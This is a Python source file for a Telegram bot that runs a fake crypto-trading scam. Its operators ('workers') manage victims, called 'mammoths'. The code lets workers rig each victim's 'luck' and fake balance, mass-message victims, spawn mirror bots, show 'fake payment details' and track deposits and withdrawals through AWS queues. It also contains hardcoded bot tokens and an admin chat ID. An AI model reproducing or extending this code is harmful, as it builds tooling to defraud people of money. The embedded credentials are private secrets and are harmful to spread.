import asyncio
import logging
from datetime import timedelta, datetime
import json
from  aws import sns, aws_region, aws_access_key_id, aws_secret_access_key
import aiobotocore as aiobotocore
from aiobotocore.config import AioConfig
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.dispatcher import FSMContext
from aiogram.types import ParseMode, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, InputFile
from aiogram.dispatcher.filters.state import State, StatesGroup
from db import Worker, session, Mammoth, Withdraws
from img import generate_profile_stats_for_worker
from test import create_mirror
from aiobotocore.session import get_session
import requests
admin_chat_id  = '881704893'
#API_TOKEN = '6686215620:AAHPv-qUVFsAKH4ShiaGNfZWd0fHVYCX2qg'
API_TOKEN = '6686215620:AAGZ4kY1EjNHu4zwP0XQDtiu9GbqYnlL3cE'
from aws import  sqs
logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())



def mammont_management_buttons(mammonth_id):
    kb = InlineKeyboardMarkup()
    mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_id).first()
    kb.add(InlineKeyboardButton(f'Удача {mammonth.luck}%', callback_data=json.dumps({'change_luck':mammonth_id})))
    kb.add(InlineKeyboardButton('Баланс', callback_data=json.dumps({'change_balance':mammonth_id})))
    kb.add((InlineKeyboardButton('Статистика', callback_data=json.dumps({'show_stats':mammonth_id}))))
    return  kb
all_mammonts = session.query(Mammoth).all()

class DistributeStates(StatesGroup):
    first = State()

@dp.callback_query_handler(lambda callback_query: callback_query.data=='distribute')
async def handle_mammonths_distribute(query:types.CallbackQuery):
    await DistributeStates.first.set()
    
    await query.message.answer('Введите сообщение для рассілки')

@dp.message_handler(state=DistributeStates.first)
async def handle_distribution(message: types.Message, state: FSMContext):
    workers_mammonts = session.query(Mammoth).filter(Mammoth.belongs_to_worker == message.from_user.id).all()
    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
    for mammonth in workers_mammonts:
        data = {'chat_id':mammonth.telegram_id, 'text':message.text}
        requests.post(url = f'https://api.telegram.org/bot{worker.token}/sendMessage', data = data)
    await state.finish()


@dp.message_handler(lambda message:message.text.startswith('/t'))
async def get_info_about_mammonth(message: types.Message):
    mammonth_service_id = message.text.split('t')[1]
    mammonth = session.query(Mammoth).filter(Mammoth.service_id == mammonth_service_id).first()
    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
    try:
        if mammonth.belongs_to_worker == worker.telegram_id:

            template = f'''
💙 Мамонт с ID *{mammonth.service_id}* 

Telegram ID: `{mammonth.telegram_id}`
ID мамонта: *t{mammonth.service_id}*
Имя: {mammonth.first_name}

Баланс: {mammonth.balance}₽
На выводе: {mammonth.on_output} ₽
Валюта: RUB
    '''
            await message.answer(template, parse_mode=ParseMode.MARKDOWN, reply_markup=mammont_management_buttons(mammonth.telegram_id))
    except AttributeError:
        await message.answer('Мамонт не найден!')

@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"show_stats":'))
async def handle_mammonth_show_stats(query:types.CallbackQuery):
    mammonth_telegram_id = json.loads(query.data)['show_stats']
    mamonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_telegram_id).first()
    template = f'''
🖤 Статистика мамонта *t{mamonth.service_id}* _{mamonth.first_name}_

Удачных сделок: *{mamonth.succesful_deals}*
Неудачных сделок: *{mamonth.deals - mamonth.succesful_deals}*
Общая прибыль: *{mamonth.profit}*₽ 
    
    
    '''
    await query.message.answer(template, parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"change_luck":'))
async def handle_change_luck_mammonth(query:types.CallbackQuery):
    button = query.message.reply_markup.inline_keyboard[0][0]

    mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == json.loads(query.data)['change_luck']).first()
    if mammonth.luck == 100:
        mammonth.luck = 0
    else:
        mammonth.luck += 25
    session.commit()
    button.text = f'Удача {mammonth.luck}%'

    # Обновляем сообщение, чтобы применить изменения
    await query.message.edit_reply_markup(reply_markup=query.message.reply_markup)

class Change_mammonths_balance(StatesGroup):
    first = State()

@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"change_balance":'))
async def handle_change_balance_mammonth(query:types.CallbackQuery):
    state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
    data = dict()
    data['id'] = json.loads(query.data)['change_balance']
    await  state.set_data(data)
    await Change_mammonths_balance.first.set()
    await query.answer('Введите желаемую сумму баланса мамонта')

@dp.message_handler(state=Change_mammonths_balance.first)
async def change_balance(message: types.Message, state: FSMContext):
    data = await state.get_data()
    mammonth_telegram_id =data['id']
    mamonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_telegram_id ).first()
    try:
        mamonth.balance = float(message.text)
        session.commit()
        await message.answer("Баланс успешно изменен!")
    except Exception as ex:
        await message.answer('Введите корректное число')
    await  state.finish()

async def process_sqs_messages():
    session_aws = get_session()

    async with session_aws.create_client( service_name = 'sqs',
    aws_access_key_id=aws_access_key_id,
    aws_secret_access_key=aws_secret_access_key,
    region_name=aws_region) as sqs:
        while True:
            response = await sqs.receive_message(
                QueueUrl='https://sqs.eu-north-1.amazonaws.com/441199499768/NewApplications',
                AttributeNames=['All'],
                MaxNumberOfMessages=1,
                MessageAttributeNames=['All'],
                VisibilityTimeout=0,
                WaitTimeSeconds=0
            )
            response_for_deals = await sqs.receive_message(
                QueueUrl='https://sqs.eu-north-1.amazonaws.com/441199499768/NewApplicationsOnBid',
                AttributeNames=['All'],
                MaxNumberOfMessages=1,
                MessageAttributeNames=['All'],
                VisibilityTimeout=0,
                WaitTimeSeconds=0


            )
            response_for_withdraws = await sqs.receive_message(
                QueueUrl='https://sqs.eu-north-1.amazonaws.com/441199499768/ApplicationsToWithdraw1',
                AttributeNames=['All'],
                MaxNumberOfMessages=1,
                MessageAttributeNames=['All'],
                VisibilityTimeout=0,
                WaitTimeSeconds=0

            )
            try:
                diction_for_deals = response_for_deals['Messages'][0]['Body']
                msg_attributes = (json.loads(diction_for_deals).get('MessageAttributes'))
                MammonthTelegramId = json.loads(msg_attributes).get('MammonthTelegramId')
                Amount = json.loads(diction_for_deals).get('Amount')
                mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == MammonthTelegramId).first()
                if Amount < 0:
                    await  bot.send_message(mammonth.belongs_to_worker, f'{mammonth.name} совершил неприбыльную сделку и потерял {Amount} RUB')
                else:
                    await  bot.send_message(mammonth.belongs_to_worker, f'{mammonth.name} совершил прибыльную сделку и получил {Amount} RUB')
            except Exception as ex:
                print(ex)

            try:
                diction = response['Messages'][0]['Body']
                msg_attributes = (json.loads(diction).get('MessageAttributes'))
                print(msg_attributes)
                print(msg_attributes['MammonthId']['Value'])
                print(msg_attributes['Sum']['Value'])
                await bot.send_message(
                    int(msg_attributes['WorkerId']['Value']),
                    f'''💹 Новая заявка на пополнение! (Трейдинг)
                    

🐘 Мамонт: {msg_attributes['FirstName']['Value']} [/{msg_attributes['MammonthId']['Value']}]!!
💳 Сумма: {msg_attributes['Sum']['Value']} RUB
                ''', reply_markup=create_top_up_mammonths_balance_button(mammonths_telegram_id=msg_attributes['MammonthId']['Value'], amount=msg_attributes['Sum']['Value'])
                )
                message = response['Messages'][0]
                receipt_handle = message['ReceiptHandle']
                await sqs.delete_message(QueueUrl='https://sqs.eu-north-1.amazonaws.com/441199499768/NewApplications', ReceiptHandle=receipt_handle)

            except Exception as ex:
                print(ex)
                print('!!!!!!')


            try:
                message = response_for_withdraws['Messages'][0]
                receipt_handle = message['ReceiptHandle']
                diction_for_withdraws = response_for_withdraws['Messages'][0]['Body']
                msg_attributes = (json.loads(diction_for_withdraws).get('MessageAttributes'))
                print(msg_attributes)
                withdraw_id = msg_attributes.get('withdraw_id')['Value']
                print(msg_attributes, withdraw_id)
                withdraw = session.query(Withdraws).filter(Withdraws.id == int(withdraw_id)).first()
                mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == withdraw.user_id).first()

                await bot.send_message(withdraw.user_id, f'''Пользователь {mammonth.first_name} (/t{mammonth.service_id}) хочет вывести *{withdraw.amount}* на счет `{withdraw.card}`''', parse_mode=ParseMode.MARKDOWN)
                await  sqs.delete_message(QueueUrl='https://sqs.eu-north-1.amazonaws.com/441199499768/ApplicationsToWithdraw1', ReceiptHandle=receipt_handle)
            except Exception as ex:
                print(ex, "пишка")
            await asyncio.sleep(10)


class QuestionsAndAnswersStates(StatesGroup):
    first = State()
    second = State()
    third = State()


class create_mirror_bot_states(StatesGroup):
    first = State()
    second = State()



def admin_approval_button(telegram_id):

    return InlineKeyboardMarkup().add(InlineKeyboardButton("Разрешить воркеру создать аккаунт", callback_data=json.dumps({"approvetocreateaccount":telegram_id})),
                                                           InlineKeyboardButton(
        'Запретить', callback_data=json.dumps({"disapprovetocreateaccount":telegram_id})))


def create_button_how_to_input_token():
    url = 'https://telegra.ph/Kak-sdelat-token-dlya-zerkala-04-07'
    return InlineKeyboardMarkup().add(InlineKeyboardButton("Как создать токен?", url=url))

def create_agree_button():
    return InlineKeyboardMarkup().add(InlineKeyboardButton('Согласен с правилами', callback_data='agreewithterms'))


def create_verification_button():
    return InlineKeyboardMarkup().add(InlineKeyboardButton('Проверить верификацию', callback_data='verifyThatUserIsNotUkrainian'))

def create_top_up_mammonths_balance_button(mammonths_telegram_id, amount):
    print(json.dumps({'mammonths_telegram_id' : mammonths_telegram_id, 'amount':amount}))
    return InlineKeyboardMarkup().add(InlineKeyboardButton('Пополнить', callback_data=json.dumps({'mammonths_telegram_id' : mammonths_telegram_id, 'amount':amount})))


def after_mamonts_management():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton('Мои мамонты', callback_data='my_mammonts'))
    kb.add(InlineKeyboardButton('Массовая рассылка', callback_data='distribute'))
    kb.add(InlineKeyboardButton('Настройки', callback_data='mammonts_settings'))
    return kb

    # Создаем клавиатуру
markup = ReplyKeyboardMarkup(resize_keyboard=True)

    # Создаем кнопки и добавляем их к клавиатуре
profile_button = KeyboardButton("Профиль 🐳")
nft_button = KeyboardButton("NFT 💠")
trading_button = KeyboardButton("Трейдинг 📊")
casino_button = KeyboardButton("Казино 🎰")
arbitrage_button = KeyboardButton("Арбитраж 🌐")
about_button = KeyboardButton("О проекте 👨‍💻")

    # Добавляем кнопки к клавиатуре (можно добавить больше кнопок)
markup.add(profile_button, nft_button, trading_button)
markup.add(casino_button, arbitrage_button, about_button)


def create_markup_for_trading():
    markup_for_trading = InlineKeyboardMarkup()
    markup_for_trading.add(InlineKeyboardButton('Управление мамонтам', callback_data='mammonths_management'))
    markup_for_trading.add(InlineKeyboardButton('Создать зеркало бота', callback_data='create_mirror'))
    markup_for_trading.add(InlineKeyboardButton('Минималка', callback_data='minimal_amount'))
    return markup_for_trading
@dp.message_handler(lambda message: message.text in ["Профиль 🐳", "NFT 💠", "Трейдинг 📊", "Казино 🎰", "Арбитраж 🌐", "О проекте 👨‍💻"])
async def handle_menu(message: types.Message):
    # Обработка нажатия кнопок
    if message.text == "Профиль 🐳":
        await showprofile(message)
    elif message.text == "NFT 💠":
        await message.answer("Вы выбрали 'NFT 💠'")
    elif message.text == "Трейдинг 📊":
        service_id=session.query(Worker).filter(Worker.telegram_id==message.from_user.id).first().service_id
        template =f'''
📊 Трейдинг

📋 Ваш код: `{service_id}`

💳 Ваши фейк реквизиты: ???

🔗 Ваша реферальная ссылка:&&)
        
        
        
        '''
        await message.answer(template, reply_markup=create_markup_for_trading(), parse_mode=ParseMode.MARKDOWN)
    elif message.text == "Казино 🎰":
        await message.answer("Вы выбрали 'Казино 🎰'")
    elif message.text == "Арбитраж 🌐":
        await message.answer("Вы выбрали 'Арбитраж 🌐'")
    elif message.text == "О проекте 👨‍💻":
        await message.answer("Вы выбрали 'О проекте 👨‍💻'")


async def showprofile(message: types.Message):
    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
    await generate_profile_stats_for_worker(str(worker.telegram_id), str(worker.balance), str(worker.profit), str(worker.warnings), worker.payment_method )
    caption = f"""
🗃 Твой профиль [{worker.telegram_id}],  0 уровень!

Код для сервисов: {worker.service_id}

💸 У тебя {worker.profit_quantity} профитов на сумму {worker.profit} RUB
Средний профит 0 RUB

Приглашено: {len(session.query(Mammoth).filter(Mammoth.belongs_to_worker == message.from_user.id).all())} воркеров
Баланс: {worker.balance} RUB
Статус: Воркер
Предупреждений: [{worker.warnings}/3]
Способ выплаты: {worker.payment_method}

В команде: {(datetime.utcnow() - worker.created_at).days+1} день/дня

🌕 Всё работает, воркаем!
    
    
    
    """


    with open(f'{worker.telegram_id}.png', 'rb') as img:
        await bot.send_photo(chat_id=message.chat.id, photo=InputFile(img), caption=caption, reply_markup=markup)

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    if not session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first():
    # Текст с правилами
        rules_text = """
💬 Правила Binance Naeb  💬 

Запрещено:

`🔸 Распространение запрещённых материалов, 18+ GIF/Стикеров/Видео/Фото`
`🔸 Попрошайничество`
`🔸 Реклама сторонних проектов или же услуг`
`🔸 Дезинформация о проекте`
`🔸 Принимать платежи на свои реквизиты`
`🔸 Спамить или тегать стафф, потому что вам не отвечают в лс`
`🔸 Оскорблять национальность/высказывать свои полит взгляды`
`🔸 Использовать любые ТП кроме ботов тимы`
`🔸 Оскорблять любого из представителей администрации`

Вы ознакомились и согласились с правилами проекта ✅
    """

        await  message.answer('⚡', reply_markup=markup)
        msg = await message.reply(rules_text, parse_mode=ParseMode.MARKDOWN, reply_markup=create_agree_button())
        loop = asyncio.get_event_loop()
        loop.run_until_complete(await process_sqs_messages())
    else:
        await showprofile(message)
        loop = asyncio.get_event_loop()
        loop.run_until_complete(await process_sqs_messages())

@dp.callback_query_handler(lambda callback_query: callback_query.data == 'agreewithterms')
async def handle_agree_callback(query: types.CallbackQuery):
    await query.message.delete()
    await query.message.answer("Здравствуйте! Пожалуйста, ответьте на следующие вопросы:\n"
                        "1. У вас есть опыт работы в такой сфере? (Да/Нет)")
    # Устанавливаем состояние ожидания ответа на первый вопрос
    await QuestionsAndAnswersStates.first.set()


@dp.callback_query_handler(lambda callback_query: callback_query.data == 'create_mirror')
async def create_mirror_handler(query: types.CallbackQuery):



    await create_mirror_bot_states.first.set()
    await query.message.answer('Введите токен бота', reply_markup=create_button_how_to_input_token())


@dp.callback_query_handler(lambda callback_query: callback_query.data == 'my_mammonts' )
async def my_mammonts_handler(query: types.CallbackQuery):
    worker = session.query(Worker).filter(Worker.telegram_id ==  query.from_user.id  ).first()
    template = 'Ваши маммонты'
    from aiogram.types import  User
    mammonts = worker.mammonts.split(',')[:-1]
    for mammont in mammonts:
        mammont_from_db = session.query(Mammoth).filter(Mammoth.telegram_id == mammont).first()

        template += f'''
У тебя {len(mammonts)} мамонт/мамонта
(/t{mammont_from_db.service_id}) - {mammont_from_db.first_name} - *{mammont_from_db.balance}*, Фарт - {mammont_from_db.luck}
'''
    await query.message.answer(template, parse_mode=ParseMode.MARKDOWN)
@dp.message_handler(state=create_mirror_bot_states.first)
async def create_mirror_states_first_handler(message: types.Message, state: FSMContext):
    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()

    async with state.proxy() as data:
        data['mirror_bot_token'] = message.text
    await state.finish()
    import threading
    mirror_bot_thread =  threading.Thread(target=create_mirror, args=(message.text, message.from_user.id))
    mirror_bot_thread.start()

    await message.reply(f"""Создание зеркала завершено!""", parse_mode=ParseMode.MARKDOWN)
    worker.token = message.text
    session.commit()
@dp.callback_query_handler(lambda callback_query:callback_query.data=='mammonths_management')
async def mammonts_management_handler(query:types.CallbackQuery):
    worker_id = query.message.from_user.id

    await query.message.delete()
    await query.message.answer( '📊 Выберите *действие*', reply_markup=after_mamonts_management(), parse_mode=ParseMode.MARKDOWN)



@dp.message_handler(state=QuestionsAndAnswersStates.first)
async def answer1(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['id'] = message.from_user.id
        data['answer1'] = message.text.lower()
    # Задаем второй вопрос
    await message.reply("2. Откуда Вы узнали о нас?")
    # Устанавливаем состояние ожидания ответа на второй вопрос
    await QuestionsAndAnswersStates.second.set()

@dp.message_handler(state=QuestionsAndAnswersStates.second)
async def answer2(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['answer2'] = message.text
    # Задаем третий вопрос
    await message.reply("3. У вас есть опыт работы в такой сфере? (Да/Нет)")
    # Устанавливаем состояние ожидания ответа на третий вопрос
    await QuestionsAndAnswersStates.third.set()


@dp.message_handler(state=QuestionsAndAnswersStates.third)
async def answer3(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['answer3'] = message.text.lower()

    # Отправляем ответы администратору
    await bot.send_message(admin_chat_id, f"Ответы пользователя: `{data['id']}` \n"
                                         f"1. Опыт работы в сфере: {data['answer1']}\n"
                                         f"2. Источник информации: {data['answer2']}\n"
                                         f"3. Опыт работы в сфере: {data['answer3']}", parse_mode=ParseMode.MARKDOWN, reply_markup=admin_approval_button(
        message.from_user.id))
    # Завершаем состояние
    await state.finish()


@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"mammonths_telegram_id":'))
async def handle_top_up_mammonths_balance(query: types.CallbackQuery):
    data = json.loads(query.data)
    mammonths_telegram_id = int(data['mammonths_telegram_id'])
    amount = int(data['amount'])
    mammonth = session.query(Mammoth).filter(Mammoth.telegram_id==mammonths_telegram_id).first()
    mammonth.balance += amount
    session.commit()
    await query.message.answer('Вы оплатили заявку', parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"approvetocreateaccount": '))
async def handle_approve_callback(query: types.CallbackQuery):

    chat_id = json.loads(query.data)['approvetocreateaccount']
    chat = await  bot.get_chat(chat_id)
    await bot.send_message(chat_id, "Вы верифицированный пользователь. Теперь вы имеете право пользоваться функциями для воркеров")


    new_user = Worker(telegram_id=chat_id, name=chat.username)
    session.add(new_user)
    session.commit()


@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"disapprovetocreateaccount": '))
async def handle_approve_callback(query: types.CallbackQuery):
    chat_id = json.loads(query.data)['approvetocreateaccount']
    await bot.send_message(chat_id, "Вам запрещено пользоваться функциями для воркеров")






if __name__ == '__main__':

    from aiogram import executor

    storage = MemoryStorage()
    # Подключаем MemoryStorage к боту
    dp.storage = storage
    executor.start_polling(dp, skip_updates=True)
